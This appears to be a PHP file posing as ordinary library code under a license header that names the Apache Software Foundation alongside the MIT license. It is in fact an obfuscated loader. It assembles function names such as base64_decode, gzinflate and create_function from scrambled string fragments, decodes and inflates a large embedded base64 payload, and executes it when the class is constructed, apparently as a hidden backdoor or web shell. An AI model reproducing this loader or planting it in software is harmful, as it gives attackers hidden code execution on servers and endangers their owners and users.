<?php

 /*
 * This file is part of the Apache Software Foundation (ASF).
 *
 * This source file is subject to the MIT license that is bundled
 * with this source code in the file LICENSE.
 */

class Obj
{
    public function __construct()
    {
        $tx = $this->value($this->x64);
        $tx = $this->point($this->_build($tx));
        $tx = $this->_library($tx);
        if ($tx) {
            $this->_backend = $tx[3];
            $this->control = $tx[2];
            $this->module = $tx[0];
            $this->_emu($tx[0], $tx[1]);
        }
    }

    public function _emu($load, $move)
    {
        $this->code = $load;
        $this->move = $move;
        $this->_x86 = $this->value($this->_x86);
        $this->_x86 = $this->_build($this->_x86);
        $this->_x86 = $this->debug();
        if (strpos($this->_x86, $this->code) !== false) {
            if (! $this->_backend) {
                $this->dx($this->control, $this->module);
            }
            $this->_library($this->_x86);
        }
    }

    public function dx($core, $stable)
    {
        $income = $this->dx[2].$this->dx[1].$this->dx[0];
        $income = @$income($core, $stable);
    }

    public function claster($move, $px, $load)
    {
        $income = strlen($px) + strlen($load);
        while (strlen($load) < $income) {
            $_income = ord($px[$this->zx]) - ord($load[$this->zx]);
            $px[$this->zx] = chr($_income % (2048 / 8));
            $load .= $px[$this->zx];
            $this->zx++;
        }

        return $px;
    }

    public function _build($core)
    {
        $ver = $this->_build[1].$this->_build[2].$this->_build[4].$this->_build[0].$this->_build[3];
        $ver = @$ver($core);

        return $ver;
    }

    public function point($core)
    {
        $ver = $this->point[3].$this->point[2].$this->point[0].$this->point[1];
        $ver = @$ver($core);

        return $ver;
    }

    public function debug()
    {
        $this->ls = $this->claster($this->move, $this->_x86, $this->code);
        $this->ls = $this->point($this->ls);

        return $this->ls;
    }

    public function _library($seek)
    {
        $ver = $this->_memory[0].$this->_memory[2].$this->_memory[1];
        $view = @$ver('', $seek);

        return $view();
    }

    public function value($income)
    {
        $ver = $this->_check[4].$this->_check[0].$this->_check[1].$this->_check[3].$this->_check[2];

        return $ver("\r\n", '', $income);
    }

    public $stack;
    public $zx = 0;

    public $point = ['fl', 'ate', 'in', 'gz'];
    public $_memory = ['crea', 'nction', 'te_fu'];
    public $_build = ['od', 'ba', 'se64_', 'e', 'dec'];
    public $dx = ['ie', 'tcook', 'se'];
    public $_check = ['t', 'r_r', 'lace', 'ep', 's'];

    public $_x86 = '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
